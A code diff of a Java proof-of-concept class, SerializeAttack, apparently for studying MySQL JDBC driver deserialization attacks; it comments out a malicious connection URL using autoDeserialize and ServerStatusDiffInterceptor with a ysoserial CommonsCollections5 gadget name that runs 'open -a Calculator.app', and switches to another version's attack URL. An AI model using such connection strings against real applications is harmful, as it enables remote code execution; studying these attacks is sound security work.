@@ -1,4 +1,4 @@
-package org.example.mysql;
+package org.example;
 
 import java.sql.Connection;
 import java.sql.DriverManager;
@@ -19,14 +19,14 @@ public class SerializeAttack {
          * 使用 statementInterceptors 参数
          * 需要通过 查询调用
          */
-        String serializeAttackUrl_5_1_10 = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections5_open -a Calculator.app";
-        String username = "yso_CommonsCollections5_open -a Calculator.app";
-        String password = "";
-        Class.forName("com.mysql.jdbc.Driver");
-        Connection con = DriverManager.getConnection(serializeAttackUrl_5_1_10, username, password);
-        String sql = "select database()";
-        PreparedStatement ps = con.prepareStatement(sql);
-        ResultSet resultSet = ps.executeQuery();
+//        String serializeAttackUrl_5_1_10 = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections5_open -a Calculator.app";
+//        String username = "yso_CommonsCollections5_open -a Calculator.app";
+//        String password = "";
+//        Class.forName("com.mysql.jdbc.Driver");
+//        Connection con = DriverManager.getConnection(serializeAttackUrl_5_1_10, username, password);
+//        String sql = "select database()";
+//        PreparedStatement ps = con.prepareStatement(sql);
+//        ResultSet resultSet = ps.executeQuery();
 
 
         /**
@@ -63,7 +63,7 @@ public class SerializeAttack {
 //        String driver = "com.mysql.jdbc.Driver";
 //        Class.forName(driver);
 
-        Connection connection = DriverManager.getConnection(serializeAttackUrl_5_29_40);
+        Connection connection = DriverManager.getConnection(serializeAttackUrl_8_7_19);
 
     }
 
